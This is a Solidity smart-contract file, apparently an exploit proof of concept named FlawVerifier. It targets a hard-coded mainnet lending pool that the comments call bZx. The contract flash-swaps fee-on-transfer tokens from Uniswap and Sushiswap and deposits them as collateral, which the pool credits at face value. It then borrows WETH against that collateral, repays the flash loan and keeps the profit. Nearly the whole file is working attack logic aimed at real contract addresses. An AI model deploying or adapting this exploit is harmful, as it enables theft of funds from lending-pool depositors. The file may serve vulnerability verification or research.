// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface ILoanTokenPool {
    struct LoanOpenData {
        bytes32 loanId;
        uint256 principal;
        uint256 collateral;
    }

    function loanTokenAddress() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function loanParamsIds(uint256 index) external view returns (bytes32);

    function mint(address receiver, uint256 depositAmount) external returns (uint256);
    function burn(address receiver, uint256 burnAmount) external returns (uint256);

    function getBorrowAmountForDeposit(
        uint256 depositAmount,
        uint256 initialLoanDuration,
        address collateralTokenAddress
    ) external view returns (uint256 borrowAmount);

    function borrow(
        bytes32 loanId,
        uint256 withdrawAmount,
        uint256 initialLoanDuration,
        uint256 collateralTokenSent,
        address collateralTokenAddress,
        address borrower,
        address receiver,
        bytes calldata loanDataBytes
    ) external payable returns (LoanOpenData memory);

    function marginTrade(
        bytes32 loanId,
        uint256 leverageAmount,
        uint256 loanTokenSent,
        uint256 collateralTokenSent,
        address collateralTokenAddress,
        address trader,
        bytes calldata loanDataBytes
    ) external payable returns (LoanOpenData memory);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract BalanceProbe {
    address public immutable owner;

    constructor() {
        owner = msg.sender;
    }

    function pull(address token, address from, uint256 amount) external returns (bool) {
        require(msg.sender == owner, "ONLY_OWNER");
        return _callOptionalReturn(token, abi.encodeWithSignature("transferFrom(address,address,uint256)", from, address(this), amount));
    }

    function sweep(address token, address to) external {
        require(msg.sender == owner, "ONLY_OWNER");
        uint256 amount = IERC20Minimal(token).balanceOf(address(this));
        if (amount == 0) {
            return;
        }
        _callOptionalReturn(token, abi.encodeWithSignature("transfer(address,uint256)", to, amount));
    }

    function _callOptionalReturn(address target, bytes memory data) internal returns (bool ok) {
        (bool success, bytes memory returndata) = target.call(data);
        if (!success) {
            return false;
        }
        return returndata.length == 0 || abi.decode(returndata, (bool));
    }
}

contract FlawVerifier {
    address public constant TARGET = 0xB983E01458529665007fF7E0CDdeCDB74B967Eb6;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    address public constant UNI_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address public constant SUSHI_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    address public constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address public constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address public constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    address public constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address public constant LINK = 0x514910771AF9Ca656af840dff83E8264EcF986CA;
    address public constant MKR = 0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2;
    address public constant BAT = 0x0D8775F648430679A709E98d2b0Cb6250d2887EF;
    address public constant ZRX = 0xE41d2489571d322189246DaFA5ebDe1F4699F498;
    address public constant REP = 0x1985365e9f78359a9B6AD760e32412f4a445E862;
    address public constant YFI = 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e;
    address public constant BZRX = 0x56d811088235F11C8920698a204A5010a788f4b3;

    address public constant STA = 0xa7DE087329BFcda5639247F96140f9DAbe3DeED1;
    address public constant PAXG = 0x45804880De22913dAFE09f4980848ECE6EcbAf78;
    address public constant XAUT = 0x68749665FF8D2d112Fa859AA293F07A622782F38;

    uint256 internal constant MIN_PROFIT = 0.1 ether;
    uint256 internal constant BORROW_DURATION = 28 days;

    ILoanTokenPool internal constant POOL = ILoanTokenPool(TARGET);

    struct FlashContext {
        address pair;
        address token;
        address repaymentToken;
        uint256 repaymentAmount;
        uint8 mode;
    }

    struct Route {
        address pair;
        address quoteToken;
        uint256 reserveToken;
        uint256 reserveQuote;
        bool tokenIs0;
        uint256 quotedRepaymentWeth;
    }

    BalanceProbe internal immutable probe;

    bool public executed;
    bool public profitAchieved;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;

    string public exploitPathUsed;
    string public status;

    address internal _profitToken;
    uint256 internal _profitAmount;
    FlashContext internal _flashContext;

    constructor() {
        probe = new BalanceProbe();
        _profitToken = WETH;
        status = "not-run";
    }

    function executeOnOpportunity() external {
        require(!executed, "ALREADY_EXECUTED");
        executed = true;
        _profitToken = WETH;

        address loanToken = POOL.loanTokenAddress();
        bool touchedAnyPath;

        // The lender-dilution `mint` path is only directly monetizable when the specific
        // pool underlying is fee-on-transfer. This WETH pool is not, so logs already prove
        // that branch is structurally unavailable on this instance.
        if (_isPlausibleFeeToken(loanToken) && _attemptFlashMintPath(loanToken)) {
            touchedAnyPath = true;
            _finalize();
            return;
        }

        address[13] memory collateralCandidates;
        collateralCandidates[0] = PAXG;
        collateralCandidates[1] = XAUT;
        collateralCandidates[2] = STA;
        collateralCandidates[3] = USDT;
        collateralCandidates[4] = BZRX;
        collateralCandidates[5] = WBTC;
        collateralCandidates[6] = LINK;
        collateralCandidates[7] = MKR;
        collateralCandidates[8] = BAT;
        collateralCandidates[9] = ZRX;
        collateralCandidates[10] = REP;
        collateralCandidates[11] = YFI;
        collateralCandidates[12] = DAI;

        for (uint256 index = 0; index < collateralCandidates.length; index++) {
            address collateralToken = collateralCandidates[index];
            if (collateralToken == address(0) || collateralToken == loanToken) {
                continue;
            }

            if (_attemptExistingBalanceBorrowPath(collateralToken)) {
                _finalize();
                return;
            }

            touchedAnyPath = true;

            if (_attemptFlashBorrowPath(collateralToken)) {
                _finalize();
                return;
            }
        }

        if (profitAchieved) {
            _finalize();
            return;
        }

        if (hypothesisValidated) {
            status = "validated-without-positive-net-profit";
            return;
        }

        hypothesisRefuted = true;
        status = touchedAnyPath ? "fee-token-paths-probed-but-not-self-funding" : "no-supported-fee-token-path-discovered";
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        _handleFlashCallback(sender, amount0, amount1);
    }

    function sushiCall(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        _handleFlashCallback(sender, amount0, amount1);
    }

    function _handleFlashCallback(address sender, uint256 amount0, uint256 amount1) internal {
        FlashContext memory context = _flashContext;
        require(context.pair != address(0), "NO_CONTEXT");
        require(msg.sender == context.pair, "BAD_PAIR");
        require(sender == address(this), "BAD_SENDER");

        uint256 nominalAmount = amount0 != 0 ? amount0 : amount1;
        uint256 receivedAmount = _balanceOf(context.token, address(this));
        require(receivedAmount != 0 && receivedAmount <= nominalAmount, "BAD_FLASH_AMOUNT");

        if (context.mode == 1) {
            _executeMintPathInCallback(context.token, nominalAmount, receivedAmount);
        } else {
            _executeBorrowPathInCallback(context.token, nominalAmount, receivedAmount);
        }

        _flashContext = FlashContext(address(0), address(0), address(0), 0, 0);
    }

    function _executeMintPathInCallback(address loanToken, uint256 nominalAmount, uint256 receivedAmount) internal {
        bool taxed = nominalAmount > receivedAmount || _detectTransferFromFee(loanToken, receivedAmount);
        require(taxed, "LOAN_TOKEN_NOT_FEE_ON_TRANSFER");

        uint256 spendableAmount = _balanceOf(loanToken, address(this));
        uint256 beforeLoanToken = spendableAmount;

        _forceApprove(loanToken, TARGET, spendableAmount);

        uint256 sharesBefore = POOL.balanceOf(address(this));
        uint256 mintedShares;
        try POOL.mint(address(this), spendableAmount) returns (uint256 minted) {
            mintedShares = minted;
        } catch {
            revert("MINT_PATH_FAILED");
        }

        if (mintedShares == 0) {
            uint256 sharesAfter = POOL.balanceOf(address(this));
            if (sharesAfter > sharesBefore) {
                mintedShares = sharesAfter - sharesBefore;
            }
        }
        require(mintedShares != 0, "NO_SHARES");

        hypothesisValidated = true;
        exploitPathUsed = "mint(depositAmount) overcredits fee-on-transfer loanToken deposits";

        try POOL.burn(address(this), mintedShares) returns (uint256) {
            uint256 afterLoanToken = _balanceOf(loanToken, address(this));
            require(afterLoanToken > beforeLoanToken, "NO_MINT_SPREAD");
            _profitToken = loanToken;
            _profitAmount = afterLoanToken - beforeLoanToken;
            profitAchieved = _profitAmount >= MIN_PROFIT;
        } catch {
            revert("BURN_PATH_FAILED");
        }
    }

    function _executeBorrowPathInCallback(address collateralToken, uint256 nominalAmount, uint256 receivedAmount) internal {
        uint256 spendableAmount = _balanceOf(collateralToken, address(this));
        require(spendableAmount != 0, "NO_COLLATERAL");

        bool taxed = nominalAmount > receivedAmount || _detectTransferFromFee(collateralToken, spendableAmount);
        require(taxed, "COLLATERAL_NOT_FEE_ON_TRANSFER");

        spendableAmount = _balanceOf(collateralToken, address(this));
        require(spendableAmount != 0, "NO_COLLATERAL_AFTER_PROBE");

        _forceApprove(collateralToken, TARGET, spendableAmount);

        uint256 repaymentWeth = _wethCostForRepayment(_flashContext.repaymentToken, _flashContext.repaymentAmount);
        require(repaymentWeth != type(uint256).max, "NO_REPAYMENT_ROUTE");

        uint256 borrowAmount = POOL.getBorrowAmountForDeposit(spendableAmount, BORROW_DURATION, collateralToken);
        require(borrowAmount > repaymentWeth + MIN_PROFIT, "NOT_PROFITABLE");

        uint256 safeBorrowAmount = borrowAmount - (borrowAmount / 1000);
        uint256 wethBefore = _balanceOf(WETH, address(this));

        // Added public-liquidity step: select the cheapest v2-style flashswap source first,
        // then repay it deterministically from borrowed WETH. The exploit causality is still
        // unchanged: bZx credits the nominal `collateralTokenSent` even though transferFrom
        // delivers less real collateral because the token is fee-on-transfer.
        try POOL.borrow(
            bytes32(0),
            safeBorrowAmount,
            BORROW_DURATION,
            spendableAmount,
            collateralToken,
            address(this),
            address(this),
            ""
        ) returns (ILoanTokenPool.LoanOpenData memory) {
            hypothesisValidated = true;
            exploitPathUsed = "borrow(collateralTokenSent) nominal accounting using cheapest flashswap fee collateral";
        } catch {
            revert("BORROW_PATH_FAILED");
        }

        uint256 wethAfterBorrow = _balanceOf(WETH, address(this));
        require(wethAfterBorrow > wethBefore, "NO_WETH_BORROWED");

        if (_flashContext.repaymentToken == WETH) {
            _safeTransfer(WETH, _flashContext.pair, _flashContext.repaymentAmount);
        } else {
            _swapWethForExactToken(_flashContext.repaymentToken, _flashContext.repaymentAmount);
            _safeTransfer(_flashContext.repaymentToken, _flashContext.pair, _flashContext.repaymentAmount);
        }

        uint256 remainingWeth = _balanceOf(WETH, address(this));
        require(remainingWeth >= MIN_PROFIT, "PROFIT_BELOW_THRESHOLD");

        profitAchieved = true;
        _profitToken = WETH;
        _profitAmount = remainingWeth;
    }

    function _attemptExistingBalanceBorrowPath(address collateralToken) internal returns (bool) {
        if (!_isPlausibleFeeToken(collateralToken)) {
            return false;
        }

        uint256 heldCollateral = _balanceOf(collateralToken, address(this));
        if (heldCollateral == 0) {
            return false;
        }

        if (!_detectTransferFromFee(collateralToken, heldCollateral)) {
            return false;
        }

        heldCollateral = _balanceOf(collateralToken, address(this));
        if (heldCollateral == 0) {
            return false;
        }

        uint256 borrowAmount = POOL.getBorrowAmountForDeposit(heldCollateral, BORROW_DURATION, collateralToken);
        if (borrowAmount <= MIN_PROFIT) {
            return false;
        }

        _forceApprove(collateralToken, TARGET, heldCollateral);

        uint256 safeBorrowAmount = borrowAmount - (borrowAmount / 1000);
        uint256 wethBefore = _balanceOf(WETH, address(this));
        try POOL.borrow(
            bytes32(0),
            safeBorrowAmount,
            BORROW_DURATION,
            heldCollateral,
            collateralToken,
            address(this),
            address(this),
            ""
        ) returns (ILoanTokenPool.LoanOpenData memory) {
            uint256 wethAfter = _balanceOf(WETH, address(this));
            if (wethAfter > wethBefore && wethAfter - wethBefore >= MIN_PROFIT) {
                hypothesisValidated = true;
                profitAchieved = true;
                _profitToken = WETH;
                _profitAmount = wethAfter - wethBefore;
                exploitPathUsed = "borrow(collateralTokenSent) nominal accounting using verifier-held fee collateral";
                return true;
            }
        } catch {}

        return false;
    }

    function _attemptFlashMintPath(address loanToken) internal returns (bool) {
        Route memory route = _findBestBorrowRoute(loanToken);
        if (route.pair == address(0) || route.quoteToken != WETH) {
            return false;
        }

        uint256[6] memory denominators = [uint256(1000), 500, 200, 100, 50, 20];
        for (uint256 index = 0; index < denominators.length; index++) {
            uint256 amountOut = route.reserveToken / denominators[index];
            if (amountOut <= 1) {
                continue;
            }

            uint256 repaymentWeth = _getAmountIn(amountOut, route.reserveQuote, route.reserveToken);
            if (repaymentWeth == 0) {
                continue;
            }

            _flashContext = FlashContext(route.pair, loanToken, WETH, repaymentWeth, 1);

            try IUniswapV2Pair(route.pair).swap(
                route.tokenIs0 ? amountOut : 0,
                route.tokenIs0 ? 0 : amountOut,
                address(this),
                abi.encode(uint256(1))
            ) {
                if (profitAchieved) {
                    return true;
                }
            } catch {
                _flashContext = FlashContext(address(0), address(0), address(0), 0, 0);
            }
        }

        return false;
    }

    function _attemptFlashBorrowPath(address collateralToken) internal returns (bool) {
        if (!_isPlausibleFeeToken(collateralToken)) {
            return false;
        }

        Route memory route = _findBestBorrowRoute(collateralToken);
        if (route.pair == address(0)) {
            return false;
        }

        uint256[14] memory denominators = [
            uint256(100000),
            50000,
            25000,
            10000,
            5000,
            2500,
            2000,
            1000,
            500,
            250,
            100,
            50,
            20,
            10
        ];

        for (uint256 index = 0; index < denominators.length; index++) {
            uint256 amountOut = route.reserveToken / denominators[index];
            if (amountOut <= 1) {
                continue;
            }

            uint256 repaymentAmount = _getAmountIn(amountOut, route.reserveQuote, route.reserveToken);
            if (repaymentAmount == 0) {
                continue;
            }

            uint256 quotedBorrow = POOL.getBorrowAmountForDeposit(amountOut, BORROW_DURATION, collateralToken);
            uint256 quotedRepaymentWeth = _wethCostForRepayment(route.quoteToken, repaymentAmount);
            if (quotedRepaymentWeth == type(uint256).max || quotedBorrow <= quotedRepaymentWeth + MIN_PROFIT) {
                continue;
            }

            _flashContext = FlashContext(route.pair, collateralToken, route.quoteToken, repaymentAmount, 2);

            try IUniswapV2Pair(route.pair).swap(
                route.tokenIs0 ? amountOut : 0,
                route.tokenIs0 ? 0 : amountOut,
                address(this),
                abi.encode(uint256(2))
            ) {
                if (profitAchieved) {
                    return true;
                }
            } catch {
                _flashContext = FlashContext(address(0), address(0), address(0), 0, 0);
            }
        }

        return false;
    }

    function _findBestBorrowRoute(address token) internal view returns (Route memory best) {
        address[12] memory quotes = _quoteCandidates(token);
        address[2] memory factories;
        factories[0] = UNI_V2_FACTORY;
        factories[1] = SUSHI_FACTORY;

        uint256 bestScore = type(uint256).max;

        for (uint256 quoteIndex = 0; quoteIndex < quotes.length; quoteIndex++) {
            address quote = quotes[quoteIndex];
            if (quote == address(0) || quote == token) {
                continue;
            }

            for (uint256 factoryIndex = 0; factoryIndex < factories.length; factoryIndex++) {
                address pair = _getPair(factories[factoryIndex], token, quote);
                if (pair == address(0)) {
                    continue;
                }

                (uint256 reserveToken, uint256 reserveQuote, bool tokenIs0) = _pairReserves(pair, token, quote);
                if (reserveToken <= 1 || reserveQuote <= 1) {
                    continue;
                }

                uint256 probeAmount = reserveToken / 10000;
                if (probeAmount <= 1) {
                    probeAmount = reserveToken / 1000;
                }
                if (probeAmount <= 1 || probeAmount >= reserveToken) {
                    continue;
                }

                uint256 repaymentAmount = _getAmountIn(probeAmount, reserveQuote, reserveToken);
                if (repaymentAmount == 0) {
                    continue;
                }

                uint256 repaymentWeth = _wethCostForRepayment(quote, repaymentAmount);
                if (repaymentWeth == type(uint256).max) {
                    continue;
                }

                if (repaymentWeth < bestScore) {
                    bestScore = repaymentWeth;
                    best = Route(pair, quote, reserveToken, reserveQuote, tokenIs0, repaymentWeth);
                }
            }
        }
    }

    function _quoteCandidates(address token) internal pure returns (address[12] memory quotes) {
        quotes[0] = WETH;
        quotes[1] = USDC;
        quotes[2] = USDT;
        quotes[3] = DAI;
        quotes[4] = WBTC;
        quotes[5] = LINK;
        quotes[6] = MKR;
        quotes[7] = BAT;
        quotes[8] = ZRX;
        quotes[9] = REP;
        quotes[10] = YFI;
        quotes[11] = BZRX;

        if (token == BZRX) {
            quotes[11] = PAXG;
        }
    }

    function _wethCostForRepayment(address repaymentToken, uint256 repaymentAmount) internal view returns (uint256) {
        if (repaymentAmount == 0) {
            return 0;
        }
        if (repaymentToken == WETH) {
            return repaymentAmount;
        }

        address pair = _bestPairFor(repaymentToken, WETH);
        if (pair == address(0)) {
            return type(uint256).max;
        }

        (uint256 reserveToken, uint256 reserveWeth,) = _pairReserves(pair, repaymentToken, WETH);
        return _getAmountIn(repaymentAmount, reserveWeth, reserveToken);
    }

    function _swapWethForExactToken(address tokenOut, uint256 amountOut) internal returns (uint256 wethSpent) {
        address pair = _bestPairFor(tokenOut, WETH);
        require(pair != address(0), "NO_WETH_REPAY_ROUTE");

        (uint256 reserveTokenOut, uint256 reserveWeth, bool tokenOutIs0) = _pairReserves(pair, tokenOut, WETH);
        wethSpent = _getAmountIn(amountOut, reserveWeth, reserveTokenOut);
        require(wethSpent != 0, "BAD_WETH_REPAY_QUOTE");

        _safeTransfer(WETH, pair, wethSpent);
        IUniswapV2Pair(pair).swap(
            tokenOutIs0 ? amountOut : 0,
            tokenOutIs0 ? 0 : amountOut,
            address(this),
            new bytes(0)
        );
    }

    function _bestPairFor(address tokenA, address tokenB) internal view returns (address pair) {
        address uni = _getPair(UNI_V2_FACTORY, tokenA, tokenB);
        address sushi = _getPair(SUSHI_FACTORY, tokenA, tokenB);

        if (uni == address(0)) {
            return sushi;
        }
        if (sushi == address(0)) {
            return uni;
        }

        (uint256 uniA, uint256 uniB,) = _pairReserves(uni, tokenA, tokenB);
        (uint256 sushiA, uint256 sushiB,) = _pairReserves(sushi, tokenA, tokenB);

        if (uniA * uniB >= sushiA * sushiB) {
            return uni;
        }
        return sushi;
    }

    function _getPair(address factory, address tokenA, address tokenB) internal view returns (address pair) {
        (bool success, bytes memory returndata) = factory.staticcall(
            abi.encodeWithSelector(IUniswapV2Factory.getPair.selector, tokenA, tokenB)
        );
        if (!success || returndata.length < 32) {
            return address(0);
        }
        pair = abi.decode(returndata, (address));
    }

    function _pairReserves(
        address pair,
        address asset,
        address quoteAsset
    ) internal view returns (uint256 reserveAsset, uint256 reserveQuote, bool assetIsToken0) {
        address token0 = IUniswapV2Pair(pair).token0();
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2Pair(pair).getReserves();
        if (token0 == asset) {
            require(IUniswapV2Pair(pair).token1() == quoteAsset, "BAD_PAIR_ASSET");
            return (uint256(reserve0), uint256(reserve1), true);
        }
        require(token0 == quoteAsset, "BAD_PAIR_QUOTE");
        return (uint256(reserve1), uint256(reserve0), false);
    }

    function _getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountOut == 0 || reserveIn == 0 || reserveOut == 0 || amountOut >= reserveOut) {
            return 0;
        }
        uint256 numerator = reserveIn * amountOut * 1000;
        uint256 denominator = (reserveOut - amountOut) * 997;
        return (numerator / denominator) + 1;
    }

    function _loanParamsId(address collateralToken, bool isTorqueLoan) internal view returns (bytes32) {
        return POOL.loanParamsIds(uint256(keccak256(abi.encodePacked(collateralToken, isTorqueLoan))));
    }

    function _isPlausibleFeeToken(address token) internal pure returns (bool) {
        return token == STA || token == PAXG || token == XAUT || token == USDT || token == BZRX;
    }

    function _finalize() internal {
        if (_profitToken == address(0)) {
            _profitToken = WETH;
        }

        uint256 realized = _balanceOf(_profitToken, address(this));
        if (_profitToken == WETH) {
            _profitAmount = realized;
        } else if (_profitAmount == 0) {
            _profitAmount = realized;
        }

        profitAchieved = _profitAmount >= MIN_PROFIT;
        hypothesisValidated = hypothesisValidated || profitAchieved;
        status = profitAchieved ? "profit-achieved" : "profit-below-threshold";
    }

    function _detectTransferFromFee(address token, uint256 balance) internal returns (bool) {
        uint256 probeAmount = balance / 1000;
        if (probeAmount == 0) {
            probeAmount = balance / 100;
        }
        if (probeAmount == 0) {
            probeAmount = 1;
        }
        if (probeAmount >= balance) {
            probeAmount = balance / 2;
        }
        if (probeAmount == 0) {
            return false;
        }

        _forceApprove(token, address(probe), probeAmount);

        uint256 beforeProbe = _balanceOf(token, address(probe));
        bool ok = probe.pull(token, address(this), probeAmount);
        if (!ok) {
            return false;
        }

        uint256 afterProbe = _balanceOf(token, address(probe));
        probe.sweep(token, address(this));

        if (afterProbe <= beforeProbe) {
            return false;
        }

        return (afterProbe - beforeProbe) < probeAmount;
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSignature("approve(address,uint256)", spender, 0));
        _callOptionalReturn(token, abi.encodeWithSignature("approve(address,uint256)", spender, amount));
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        require(_callOptionalReturn(token, abi.encodeWithSignature("transfer(address,uint256)", to, amount)), "TRANSFER_FAILED");
    }

    function _balanceOf(address token, address account) internal view returns (uint256 amount) {
        (bool success, bytes memory returndata) = token.staticcall(abi.encodeWithSignature("balanceOf(address)", account));
        if (!success || returndata.length < 32) {
            return 0;
        }
        amount = abi.decode(returndata, (uint256));
    }

    function _callOptionalReturn(address target, bytes memory data) internal returns (bool ok) {
        (bool success, bytes memory returndata) = target.call(data);
        if (!success) {
            return false;
        }
        return returndata.length == 0 || abi.decode(returndata, (bool));
    }
}
